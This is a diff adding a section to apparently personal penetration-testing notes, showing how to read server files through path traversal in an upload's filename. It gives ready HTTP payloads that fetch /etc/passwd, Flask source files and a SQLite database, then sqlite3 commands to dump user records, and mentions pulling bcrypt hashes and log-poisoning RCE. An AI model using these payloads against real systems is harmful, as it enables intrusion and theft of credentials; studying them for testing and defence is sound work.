@@ -299,6 +299,50 @@ Start with fewer `../` and add more until you hit the root; too many can trigger
 
 When the LFI returns the **raw file content** (not wrapped in HTML), binary files must be fetched as **bytes**, not as text. Some exploits (e.g. Camaleon CMS CVE-2024-46987) print `r.text` by default — for SQLite or other binaries you must save `r.content` to a file. Save the response to disk and open with `sqlite3 out.bytes`; then query tables (e.g. `cama_users` for bcrypt hashes). See [Camaleon CMS](../things-i-have-pwnd-before/camaleon-cms.md) for the full flow.
 
+### Local file read through upload filename traversal
+
+An authenticated upload may use the multipart filename when resolving the file later returned by its download feature. If the application does not normalize that value, replace a valid image filename with a traversal path and retain an accepted content type:
+
+```http
+POST /upload HTTP/1.1
+Host: TARGET
+Content-Type: multipart/form-data; boundary=BOUNDARY
+Cookie: session=SESSION_COOKIE
+
+--BOUNDARY
+Content-Disposition: form-data; name="file"; filename="../../../../../../../../etc/passwd"
+Content-Type: image/png
+
+FILE_CONTENT
+--BOUNDARY--
+```
+
+Open the resulting entry through the application's normal download interface. A vulnerable handler returns the contents of `/etc/passwd` instead of the submitted image. Use the account list to identify interactive users and candidate home directories.
+
+After confirming the read primitive, prioritize application source code. Source disclosure can reveal imports, database helpers, configuration loading, filenames, and the application's relative layout. For Flask applications, test common entry-point filenames such as `app.py` and `__init__.py`, reducing or increasing the traversal depth based on the upload directory:
+
+```http
+Content-Disposition: form-data; name="file"; filename="../../app.py"
+```
+
+```http
+Content-Disposition: form-data; name="file"; filename="../../__init__.py"
+```
+
+The source-code leak is the key step: use the disclosed code to identify the actual database filename instead of guessing. If the source shows a local SQLite database, retrieve it through the same filename field:
+
+```http
+Content-Disposition: form-data; name="file"; filename="../../database.db"
+```
+
+Preserve the downloaded response as a binary file, then enumerate the SQLite schema and user records:
+
+```bash
+sqlite3 database.db
+.tables
+select * from users;
+```
+
 ### RCE via Apache logs
 
 * Poison the User-Agent in access logs:
